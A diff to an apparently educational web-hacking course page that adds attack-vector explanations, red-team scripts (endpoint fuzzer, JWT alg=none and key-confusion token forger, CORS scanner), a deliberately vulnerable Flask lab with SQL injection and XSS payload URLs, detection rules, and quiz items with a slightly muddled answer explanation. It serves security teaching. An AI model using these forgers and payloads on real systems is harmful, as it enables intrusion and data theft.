@@ -322,6 +322,14 @@
         .severity-high { color: var(--accent); font-weight: bold; }
         .severity-medium { color: var(--amber); font-weight: bold; }
         .severity-low { color: var(--dim); font-weight: bold; }
+        @media (max-width: 768px) {
+            .container { padding: 1.5rem; }
+            .module-header h1 { font-size: 1.5rem; }
+            .nav { flex-direction: column; }
+            .nav a { border-right: none; border-bottom: 2px solid var(--border); }
+            .technique-grid { grid-template-columns: 1fr; }
+            pre { font-size: 0.75rem; }
+        }
     </style>
 </head>
 <body>
@@ -347,6 +355,16 @@
             <h4>🎯 Soldier Translation</h4>
             <p>Imagine a mail clerk who opens every envelope, reads the instructions inside, and does exactly what they say — no questions asked. A web app is that clerk. If you write "give me everyone's file" in the right format, the clerk hands it over. Web hacking is learning the clerk's language, then writing letters that make the clerk betray the building.</p>
             <p style="margin-top: 0.5rem; color: var(--dim);">The firewall is the front gate. The web application is the person inside who decides what you get to see.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🧱 Web from Zero — The Moving Parts</h4>
+            <p><strong>Browser vs. Server.</strong> Your browser is the client. It asks questions. The server is the computer in the data centre (or cloud) that holds the application and the database. The browser speaks <strong>HTTP</strong> — a text protocol that says things like "GET /login" or "POST /settings". HTTPS is HTTP wrapped in TLS encryption so the postman cannot read the letter.</p>
+            <p style="margin-top: 0.5rem;"><strong>What is a database?</strong> A filing cabinet the server queries. SQL injection happens because the server trusts your input enough to drop it straight into a database question. A database does not understand intent — it only understands the question it is given.</p>
+            <p style="margin-top: 0.5rem;"><strong>What is an interpreter?</strong> Any program that reads text and acts on it. SQL is an interpreter. The shell (<code>bash</code>, <code>cmd</code>) is an interpreter. JavaScript in the browser is an interpreter. If user input reaches an interpreter without sanitisation, the interpreter may execute part of that input as a command.</p>
+            <p style="margin-top: 0.5rem;"><strong>Cookies and sessions.</strong> HTTP is stateless — every request is a fresh letter. To remember who you are, the server gives your browser a <strong>cookie</strong>, usually a random session ID. The browser sends that cookie back with every request. Steal the cookie, wear the identity. Flags like <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> are seatbelts for cookies.</p>
+            <p style="margin-top: 0.5rem;"><strong>What is an API?</strong> An Application Programming Interface is a machine-facing menu. Instead of HTML pages, the server returns JSON. Modern web apps are mostly JavaScript in the browser calling APIs behind the scenes. If you can call the API directly, you bypass the UI and every client-side check.</p>
+            <p style="margin-top: 0.5rem;"><strong>Why does input validation matter?</strong> Because the boundary between data and code is the boundary between a user and an attacker. Validation means "I expected a phone number, and this is not one." Without it, the server treats attacker-supplied instructions as legitimate data.</p>
         </div>
 
         <div class="mentor-box">
@@ -641,6 +659,67 @@ first_name=Alex&amp;role=admin</pre>
         <h2>🔌 Phase 5: API Hacking</h2>
         <p>Modern applications are APIs with a thin JavaScript wrapper. If you can speak to the API directly, you bypass the UI and all of its client-side validation.</p>
 
+        <h2>⚡ Modern Web Attack Vectors (2024-2026)</h2>
+        <p>The classics still work, but the battlefield has shifted. Attackers now target identity flows, client-side code, caching layers, and the gap between browser and server trust models. Know these vectors because they are already in the wild.</p>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Browser-in-the-Browser (BITB) <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>A fake browser popup rendered inside a real browser tab using HTML/CSS. Victims "log in" to a Google or Microsoft look-alike window that is actually a phishing form on the attacker's page. Hard to spot because the fake window copies address bars, favicons, and HTTPS lock icons.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: pop-out the real login in a separate browser window, use password managers with domain matching, and train users to verify the real OS chrome.</p>
+            </div>
+            <div class="method-card">
+                <h4>QR Code Phishing / QRLjacking <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>Attackers display a QR code that, when scanned, logs the victim into an attacker-controlled session. Common against "scan to log in" flows (WhatsApp Web, Microsoft, SSO portals). The victim's phone authorises the session; the attacker harvests it.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: bind QR sessions to IP/location, require confirmation prompts, and expire QR codes quickly.</p>
+            </div>
+            <div class="method-card">
+                <h4>Passkey / FIDO Bypasses <span class="difficulty diff-hard">HARD</span></h4>
+                <p>Passkeys remove passwords, but implementations can still fail: relaxed attestation, missing origin validation, replay of assertion responses, or fallback to weaker MFA. If the server does not cryptographically verify the origin and challenge, a passkey becomes theatre.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: enforce strict origin checks, verify challenge signatures, and disable password fallback for high-risk users.</p>
+            </div>
+            <div class="method-card">
+                <h4>AI-Generated Phishing Landing Pages <span class="difficulty diff-easy">EASY</span></h4>
+                <p>Large language models generate polished, branded phishing pages and lure emails in seconds. The pages adapt to the target's language, industry, and current events. Quality is now high enough that traditional spelling-error detection fails.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: URL reputation, FIDO2/phishing-resistant auth, and mailbox-level link protection.</p>
+            </div>
+            <div class="method-card">
+                <h4>OAuth Consent Phishing <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>Attackers register a malicious OAuth app and trick users into granting permissions ("consent") to their Microsoft 365 or Google Workspace account. No password theft needed — the app receives a valid access token with mail, files, or calendar scope.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: restrict OAuth app consent by policy, monitor for high-scope grants, and revoke suspicious app registrations.</p>
+            </div>
+            <div class="method-card">
+                <h4>JWT "none" / Algorithm Confusion <span class="difficulty diff-hard">HARD</span></h4>
+                <p>JSON Web Tokens encode claims and a signature. If the server accepts the <code>"alg":"none"</code> algorithm, an attacker can strip the signature and forge tokens. Algorithm confusion swaps RS256 (public-key) for HS256 (symmetric) and signs with the public key as a secret.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: reject <code>none</code>, whitelist allowed algorithms, and keep asymmetric keys separate from any symmetric use.</p>
+            </div>
+            <div class="method-card">
+                <h4>Prototype Pollution <span class="difficulty diff-hard">HARD</span></h4>
+                <p>JavaScript lets objects inherit properties from a shared prototype. If an attacker can set <code>__proto__</code>, <code>constructor.prototype</code>, or similar keys on a merged object, they can poison every object in the application. Leads to RCE in Node.js, auth bypass, and client-side gadget chains.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: use <code>Object.create(null)</code>, freeze prototypes, and sanitise recursive merge inputs.</p>
+            </div>
+            <div class="method-card">
+                <h4>Web Cache Poisoning <span class="difficulty diff-hard">HARD</span></h4>
+                <p>Manipulate a request header (e.g. <code>X-Forwarded-Host</code>) so the cache stores a malicious response and serves it to other users. Can escalate to XSS, redirect hijacking, or mass defacement depending on what the application reflects.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: never trust cache keys that include attacker-controlled headers; normalise inputs before caching.</p>
+            </div>
+            <div class="method-card">
+                <h4>Host Header Injection <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>The <code>Host</code> header drives password-reset emails, internal routing, and absolute URL generation. If an attacker can override it via <code>X-Forwarded-Host</code> or a duplicate header, password-reset links can be sent to attacker domains.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: use a whitelist of valid hostnames and ignore user-supplied host override headers.</p>
+            </div>
+            <div class="method-card">
+                <h4>Server-Side Request Forgery (SSRF) <span class="difficulty diff-hard">HARD</span></h4>
+                <p>The server makes a request on behalf of the attacker. Targets include internal metadata endpoints (AWS 169.254.169.254), internal APIs, and localhost services. SSRF often starts from a URL parameter or webhook field.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: deny internal/reserved IP ranges, use allow-listed outbound destinations, and enforce URL parsing before fetching.</p>
+            </div>
+            <div class="method-card">
+                <h4>GraphQL Introspection Abuse <span class="difficulty diff-easy">EASY</span></h4>
+                <p>GraphQL APIs often expose their full schema via introspection. An attacker learns every query, mutation, type, and hidden field. Combined with missing authorization, introspection becomes a roadmap to IDOR and data exfiltration.</p>
+                <p style="margin-top: 0.5rem; color: var(--dim);">Defense: disable introspection in production, enforce query cost/depth limits, and authorise every resolver.</p>
+            </div>
+        </div>
+
         <div class="method-card" id="endpoint-enumeration">
             <h4>Endpoint Enumeration <span class="difficulty diff-easy">EASY</span></h4>
             <p>SPAs, mobile apps, and OpenAPI specs leak endpoints. Search JavaScript for route strings, inspect network traffic in DevTools, and fuzz common paths.</p>
@@ -756,6 +835,429 @@ curl http://localhost:8080/portal/api/banners</pre>
                     <li>Access another student's profile via IDOR: <code>/student?id=2</code></li>
                     <li>Escalate privileges via mass assignment: <code>POST /user/settings role=admin</code></li>
                 </ul>
+            </div>
+        </div>
+
+        <h2>🤖 Red-Team Automation</h2>
+        <p>Manual testing finds nuance; automation finds scale. These scripts are designed for authorized environments and follow the same methodology as the TAFE and diudream engagements.</p>
+
+        <h3>Endpoint Fuzzer</h3>
+        <p>Brute-force common API paths and report status codes. Use a small wordlist first; respect rate limits.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""endpoint_fuzz.py — Fast endpoint discovery with optional signing hook."""
+import sys, requests, argparse
+from urllib.parse import urljoin
+
+WORDLIST = [
+    '/api/user','/api/users','/api/admin','/api/v1/orders',
+    '/api/webapi/GetHomeSettings','/api/webapi/GetAllGameList',
+    '/graphql','/api/graphql','/swagger.json','/api-docs'
+]
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument('--base', required=True)
+    p.add_argument('--wordlist', default=None)
+    p.add_argument('--sign', action='store_true', help='Use diudream signing hook')
+    args = p.parse_args()
+    words = open(args.wordlist).read().splitlines() if args.wordlist else WORDLIST
+    for w in words:
+        url = urljoin(args.base, w)
+        try:
+            r = requests.get(url, timeout=8, allow_redirects=False)
+            if r.status_code not in (404, 410):
+                print(f'[{r.status_code}] {w} ({len(r.content)} bytes)')
+        except Exception as e:
+            print(f'[ERR] {w}: {e}')
+
+if __name__ == '__main__':
+    main()</pre>
+        </div>
+
+        <h3>Parameter Miner</h3>
+        <p>Discover hidden parameters by observing differences in response size, status, or reflected text.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""param_mine.py — Hidden parameter discovery via response diffing."""
+import requests, sys
+from urllib.parse import urljoin
+
+PARAMS = ['role','admin','debug','test','callback','redirect','next',
+          'return_to','host','url','endpoint','api_key','token']
+
+def baseline(base, path):
+    return requests.get(urljoin(base, path), timeout=10)
+
+def mine(base, path):
+    b = baseline(base, path)
+    for param in PARAMS:
+        r = requests.get(urljoin(base, path), params={param: 'true'}, timeout=10)
+        if r.status_code != b.status_code or len(r.content) != len(b.content):
+            print(f'[!] {param}=true changed response ({b.status_code}->{r.status_code}, '
+                  f'{len(b.content)}->{len(r.content)})')
+
+if __name__ == '__main__':
+    mine(sys.argv[1], sys.argv[2])</pre>
+        </div>
+
+        <h3>JWT Security Tester</h3>
+        <p>Test JWT implementations for the two most common failures: none algorithm and algorithm confusion.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""jwt_test.py — Probe JWT for alg=none and RS256->HS256 confusion."""
+import jwt, base64, json, requests, sys
+from urllib.parse import urljoin
+
+PUBKEY = open('public.pem').read()  # export from JWKS
+
+def b64url(s):
+    return base64.urlsafe_b64encode(s).rstrip(b'=').decode()
+
+def none_token(payload):
+    hdr = b64url(json.dumps({'alg':'none','typ':'JWT'}).encode())
+    bdy = b64url(json.dumps(payload).encode())
+    return f'{hdr}.{bdy}.'
+
+def confusion_token(payload, pubkey):
+    return jwt.encode(payload, pubkey, algorithm='HS256',
+                      headers={'kid':'default'})
+
+def test(base, endpoint, cookie_name, payload):
+    url = urljoin(base, endpoint)
+    for name, tok in [('none', none_token(payload)),
+                      ('confusion', confusion_token(payload, PUBKEY))]:
+        r = requests.get(url, cookies={cookie_name: tok}, timeout=10)
+        print(f'[{name}] {r.status_code} {r.url}')
+
+if __name__ == '__main__':
+    test(sys.argv[1], sys.argv[2], sys.argv[3], {'sub':'admin','role':'admin'})</pre>
+        </div>
+
+        <h3>CORS Misconfiguration Scanner</h3>
+        <p>Misconfigured <code>Access-Control-Allow-Origin</code> headers let attacker sites read authenticated responses.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""cors_scan.py — Detect dangerous CORS origin reflections."""
+import requests, sys
+
+PAYLOADS = ['https://evil.com','https://attacker.example','null','https://target.com.evil.com']
+
+def scan(url):
+    for origin in PAYLOADS:
+        r = requests.get(url, headers={'Origin': origin}, timeout=10)
+        acao = r.headers.get('Access-Control-Allow-Origin','')
+        acac = r.headers.get('Access-Control-Allow-Credentials','')
+        if origin in acao or acao == '*':
+            print(f'[!] Origin {origin!r} reflected: {acao} creds={acac}')
+
+if __name__ == '__main__':
+    scan(sys.argv[1])</pre>
+        </div>
+
+        <h3>Subdomain Takeover Checker</h3>
+        <p>Find dangling DNS records pointing to services (GitHub Pages, Heroku, Azure) that can be claimed by anyone.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""subdomain_takeover.py — Detect common dangling CNAME signatures."""
+import dns.resolver, requests, sys
+
+SIGS = {
+    'github.io': 'There isn\'t a GitHub Pages site here.',
+    'herokudns.com': 'no such app',
+    'azurewebsites.net': '404 Web Site not found',
+    'cloudapp.azure.com': 'Error 404 - Web app not found',
+}
+
+def check(domain):
+    try:
+        answers = dns.resolver.resolve(domain, 'CNAME')
+        for rdata in answers:
+            cname = str(rdata.target).rstrip('.')
+            for suffix, sig in SIGS.items():
+                if cname.endswith(suffix):
+                    body = requests.get(f'http://{domain}', timeout=10).text
+                    if sig in body:
+                        print(f'[TAKEOVER] {domain} -> {cname} ({suffix})')
+    except Exception as e:
+        pass
+
+if __name__ == '__main__':
+    for line in sys.stdin:
+        check(line.strip())</pre>
+        </div>
+
+        <h3>Nuclei-Style YAML Template</h3>
+        <p>Portable template for detecting the TAFE portal's exposed <code>/api/user</code> endpoint and the diudream unauthenticated data endpoints.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>id: web-api-info-disclosure
+info:
+  name: API information disclosure
+  author: 22nd-survey-division
+  severity: high
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/students"
+    matchers:
+      - type: word
+        words:
+          - "username"
+          - "student_number"
+        condition: or
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/webapi/GetDailyProfitRank"
+    body: '{}'
+    matchers:
+      - type: word
+        words:
+          - "dataList"
+          - "penarikanList"</pre>
+        </div>
+
+        <h2>🛡️ Blue-Team Counterattack Automation</h2>
+        <p>Detection and response must keep pace with automated attacks. These rules, scripts, and traps turn web logs into actionable defence.</p>
+
+        <h3>Sigma Rules for Web Attacks</h3>
+        <p>Sigma is a generic log format. Convert to Splunk, Sentinel, or Elastic with <code>pySigma</code>.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>title: SQL Injection Probe
+detection:
+  selection:
+    - cs-uri-query|contains:
+        - "' OR '1'='1"
+        - "UNION SELECT"
+        - "; DROP TABLE"
+  condition: selection
+---
+title: Mass Assignment Probe
+detection:
+  selection:
+    - cs-method: POST
+    - cs-uri-stem: /user/settings
+    - cs-uri-query|contains: role=admin
+  condition: selection
+---
+title: JWT Algorithm Confusion
+detection:
+  selection:
+    - request_body|contains: '"alg":"none"'
+    - request_body|contains: '"alg":"HS256"'
+  condition: selection</pre>
+        </div>
+
+        <h3>Suricata / Snort Rules</h3>
+        <p>Network-level detection for common probes and exfiltration.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>alert http any any -> any any (msg:"WEB-SQLi UNION SELECT probe";
+    content:"UNION SELECT"; http_uri; sid:1000001; rev:1;)
+
+alert http any any -> any any (msg:"WEB-SSRF metadata endpoint probe";
+    content:"169.254.169.254"; http_uri; sid:1000002; rev:1;)
+
+alert http any any -> any any (msg:"WEB-GraphQL introspection query";
+    content:"__schema"; http_client_body; sid:1000003; rev:1;)</pre>
+        </div>
+
+        <h3>ModSecurity CRS Tuning</h3>
+        <p>Core Rule Set blocks many injection patterns out of the box. Tune to avoid breaking legitimate traffic.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre># Enable SQLi and XSS rules, log only at first
+SecRuleEngine DetectionOnly
+SecAction "id:900001,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"
+
+# Whitelist a trusted internal scanner IP
+SecRule REMOTE_ADDR "@ipMatch 10.0.0.0/8" \
+    "id:1001,phase:1,allow,ctl:ruleEngine=Off"
+
+# Custom rule for mass assignment on role field
+SecRule REQUEST_BODY "@rx \brole\s*=\s*admin\b" \
+    "id:1002,phase:2,deny,status:403,msg:'Mass assignment attempt'"</pre>
+        </div>
+
+        <h3>WAF Log Analysis Script</h3>
+        <p>Parse WAF or web-server logs for attack patterns and score source IPs.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""waf_analyse.py — Score IPs from WAF logs."""
+import re, sys, collections
+from pathlib import Path
+
+PATTERNS = {
+    'sqli': re.compile(r"union\s+select|';\s*--|sleep\(|benchmark\(", re.I),
+    'xss': re.compile(r"<script|javascript:|onerror=", re.I),
+    'ssrf': re.compile(r"169\.254\.\d+\.\d+|localhost|127\.0\.0\.1", re.I),
+    'idor': re.compile(r"\?id=\d+|/api/user/\d+", re.I),
+}
+
+scores = collections.Counter()
+for line in sys.stdin:
+    ip = line.split()[0]
+    for name, pat in PATTERNS.items():
+        if pat.search(line):
+            scores[ip] += 1
+            print(f'[{name}] {ip}: {line.strip()[:120]}')
+
+print('\nTop offenders:')
+for ip, score in scores.most_common(20):
+    print(f'{ip}: {score}')</pre>
+        </div>
+
+        <h3>Honeytoken Deployment</h3>
+        <p>Plant fake credentials and canary tokens. When they are used, you know an attacker is inside.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""honeytoken.py — Fake API key endpoint that alerts when used."""
+from flask import Flask, request, jsonify
+import logging, datetime
+
+app = Flask(__name__)
+HONEY_KEYS = {'ht_live_22nd_deadbeefcafebabe'}
+logging.basicConfig(filename='honeytoken.log', level=logging.WARNING)
+
+@app.before_request
+def check_honey():
+    key = request.headers.get('X-API-Key','')
+    if key in HONEY_KEYS:
+        logging.warning(f'HONEYTOKEN USED by {request.remote_addr} at {datetime.datetime.utcnow()} '
+                        f'path={request.path} ua={request.user_agent.string}')
+        return jsonify({'error':'HONEYTOKEN TRIGGERED','incident':'SOC-001'}), 401
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5001)</pre>
+        </div>
+
+        <h3>Automated Response Playbook</h3>
+        <p>Block a source IP and revoke a session when a honeytoken or high-confidence alert fires.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""auto_respond.py — Example response actions (run with appropriate privileges)."""
+import subprocess, sys, requests
+
+def block_ip(ip):
+    # Windows Defender Firewall example
+    subprocess.run(['netsh','advfirewall','firewall','add','rule',
+                    'name=BLOCK_22ND_'+ip,'dir=in','action=block',
+                    'remoteip='+ip], check=True)
+    print(f'[+] Blocked {ip} inbound')
+
+def revoke_session(session_id, api_url):
+    r = requests.post(api_url, json={'revoke': session_id}, timeout=10)
+    print(f'[+] Revoke session {session_id}: {r.status_code}')
+
+if __name__ == '__main__':
+    block_ip(sys.argv[1])
+    # revoke_session(sys.argv[2], 'https://portal.internal/api/revoke')</pre>
+        </div>
+
+        <h2>🧪 Build Your Own Vulnerable Lab</h2>
+        <p>If you have no internet or no dedicated lab machines, run these containers locally. They cover injection, access control, authentication, API abuse, and modern client-side bugs.</p>
+
+        <div class="lab-box">
+            <h3>🐳 Docker Compose Lab Stack</h3>
+            <p>Save as <code>docker-compose.weblab.yml</code> and run <code>docker compose -f docker-compose.weblab.yml up -d</code>.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports: ["8081:80"]
+    environment:
+      - MYSQL_PASS=p@ssw0rd
+  webgoat:
+    image: webgoat/webgoat
+    ports: ["8082:8080"]
+  juice-shop:
+    image: bkimminich/juice-shop
+    ports: ["3000:3000"]
+  portswigger-labs:
+    # Use the official Burp Suite Collaborator or local static labs if available
+    image: nginx:alpine
+    ports: ["8083:80"]
+    volumes:
+      - ./labs:/usr/share/nginx/html:ro</pre>
+            </div>
+            <ul>
+                <li><strong>DVWA</strong> — classic SQLi, XSS, command injection, file upload.</li>
+                <li><strong>WebGoat</strong> — OWASP lessons on auth, crypto, access control, JWT.</li>
+                <li><strong>Juice Shop</strong> — modern Angular app with XSS, SSRF, IDOR, prototype pollution.</li>
+                <li><strong>PortSwigger Labs</strong> — follow the Web Security Academy exercises and host notes locally.</li>
+            </ul>
+        </div>
+
+        <div class="lab-box">
+            <h3>🐍 Local Flask Mock (No Docker Needed)</h3>
+            <p>A minimal intentionally vulnerable Flask app for offline practice. Save as <code>mock_vuln.py</code> and run <code>python mock_vuln.py</code>.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre>#!/usr/bin/env python3
+"""mock_vuln.py — Minimal vulnerable Flask lab for offline practice."""
+from flask import Flask, request, jsonify
+import sqlite3, os
+
+app = Flask(__name__)
+DB = 'mock_vuln.db'
+
+def init():
+    if os.path.exists(DB): os.remove(DB)
+    c = sqlite3.connect(DB)
+    c.executescript('''CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, role TEXT);
+                       INSERT INTO users VALUES(1,'alice','admin'),(2,'bob','user');''')
+    c.close()
+
+@app.route('/user')
+def user():
+    uid = request.args.get('id','1')
+    c = sqlite3.connect(DB)
+    # INTENTIONALLY VULNERABLE: IDOR + SQLi
+    row = c.execute(f"SELECT * FROM users WHERE id={uid}").fetchone()
+    c.close()
+    return jsonify({'id':row[0],'username':row[1],'role':row[2]}) if row else ('Not found',404)
+
+@app.route('/search')
+def search():
+    q = request.args.get('q','')
+    c = sqlite3.connect(DB)
+    # INTENTIONALLY VULNERABLE: SQLi
+    rows = c.execute(f"SELECT * FROM users WHERE username LIKE '%{q}%'").fetchall()
+    c.close()
+    return jsonify([{'id':r[0],'username':r[1],'role':r[2]} for r in rows])
+
+@app.route('/echo')
+def echo():
+    # INTENTIONALLY VULNERABLE: reflected XSS
+    return request.args.get('msg','')
+
+if __name__ == '__main__':
+    init()
+    app.run(host='0.0.0.0', port=5002, debug=True)</pre>
+            </div>
+            <p>Test payloads:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+<pre># IDOR / SQLi
+http://localhost:5002/user?id=2
+http://localhost:5002/user?id=1 OR 1=1
+
+# Reflected XSS
+http://localhost:5002/echo?msg=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+# Search SQLi
+http://localhost:5002/search?q=' UNION SELECT 1,username,role FROM users--</pre>
             </div>
         </div>
 
@@ -1223,9 +1725,45 @@ before returning data.</pre>
                 <div class="quiz-option" onclick="checkAnswer(this, 'd')">d) Path</div>
                 <div class="quiz-feedback"></div>
             </div>
+
+            <div class="quiz-question" data-answer="b" style="margin-top: 2rem;">
+                <p><strong>6. Which modern attack renders a fake login window inside a real browser tab using HTML and CSS?</strong></p>
+                <div class="quiz-option" onclick="checkAnswer(this, 'a')">a) OAuth consent phishing</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'b')">b) Browser-in-the-browser (BITB)</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'c')">c) JWT algorithm confusion</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'd')">d) SSRF</div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question" data-answer="c" style="margin-top: 2rem;">
+                <p><strong>7. What is the primary risk of accepting <code>"alg":"none"</code> in a JSON Web Token?</strong></p>
+                <div class="quiz-option" onclick="checkAnswer(this, 'a')">a) The token becomes too long</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'b')">b) The cookie flag is ignored</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'c')">c) Anyone can forge a valid token</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'd')">d) The browser rejects the token</div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question" data-answer="d" style="margin-top: 2rem;">
+                <p><strong>8. A WAF log shows repeated requests containing <code>169.254.169.254</code> in the URI. What attack is likely being attempted?</strong></p>
+                <div class="quiz-option" onclick="checkAnswer(this, 'a')">a) XSS</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'b')">b) IDOR</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'c')">c) Mass assignment</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'd')">d) SSRF</div>
+                <div class="quiz-feedback"></div>
+            </div>
+
+            <div class="quiz-question" data-answer="a" style="margin-top: 2rem;">
+                <p><strong>9. Which blue-team control plants fake credentials so that using them triggers an alert?</strong></p>
+                <div class="quiz-option" onclick="checkAnswer(this, 'a')">a) Honeytoken</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'b')">b) ModSecurity CRS</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'c')">c) CORS scanner</div>
+                <div class="quiz-option" onclick="checkAnswer(this, 'd')">d) Subdomain takeover checker</div>
+                <div class="quiz-feedback"></div>
+            </div>
         </div>
 
-        <h2>🔗 Cross-Links &amp; Next Steps</h2>
+        <h2>🔗 Cross-Links & Next Steps</h2>
         <p>Web hacking sits at the intersection of many disciplines. Review these related modules to deepen your understanding:</p>
         <div class="technique-grid">
             <div class="method-card">
@@ -1241,12 +1779,20 @@ before returning data.</pre>
                 <p>Automation and scripting for repeatable web testing workflows.</p>
             </div>
             <div class="method-card">
-                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: Command &amp; Control</a></h4>
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: Command & Control</a></h4>
                 <p>What happens after the web shell or stolen session opens a door.</p>
             </div>
             <div class="method-card">
                 <h4><a href="MODULE_17_SOCIAL_ENGINEERING.html" class="cross-link">Module 17: Social Engineering</a></h4>
                 <p>How stolen credentials and phishing enable authenticated web attacks.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_21_MOBILE.html" class="cross-link">Module 21: Mobile</a></h4>
+                <p>Mobile apps are another API client; many web attacks apply to mobile backends.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_23_INFOSTEALERS.html" class="cross-link">Module 23: Infostealers</a></h4>
+                <p>How session cookies and credentials are stolen and monetised.</p>
             </div>
             <div class="method-card">
                 <h4><a href="../defensive-recon.html" class="cross-link">Defensive Recon</a></h4>
@@ -1255,7 +1801,7 @@ before returning data.</pre>
         </div>
 
         <div class="warning-box">
-            <h5>⚠️ Legal &amp; Ethical Notice</h5>
+            <h5>⚠️ Legal & Ethical Notice</h5>
             <p>All techniques in this module are for <strong>authorized cybersecurity education</strong> only. Test only systems you own or have explicit written permission to assess. Unauthorized access to computer systems is illegal in most jurisdictions. The TAFE mock portal and diudream findings use synthetic/mock data and were tested within authorized scope.</p>
         </div>
 
@@ -1302,10 +1848,10 @@ before returning data.</pre>
 
         function getExplanation(answer) {
             const explanations = {
-                'a': 'HMAC-SHA256 with a server-side secret is the correct replacement because the secret never leaves the server.',
-                'b': 'SQL injection is caused by concatenating user input into interpreted queries. Parameterized queries fix it.',
-                'c': 'IDOR occurs when object references are exposed and authorization is missing.',
-                'd': 'The timestamp is added after the signature is computed, so it must be excluded from the MD5 payload.'
+                'a': 'Honeytokens are fake credentials or canary tokens that alert defenders when used.',
+                'b': 'HttpOnly prevents JavaScript from reading the cookie, mitigating XSS-based session theft. Browser-in-the-browser (BITB) renders a fake browser window inside a real tab to steal credentials.',
+                'c': 'Accepting alg:none means the signature is ignored, so anyone can forge a valid token.',
+                'd': '169.254.169.254 is the link-local metadata IP targeted by SSRF attacks against cloud instances.'
             };
             return explanations[answer];
         }
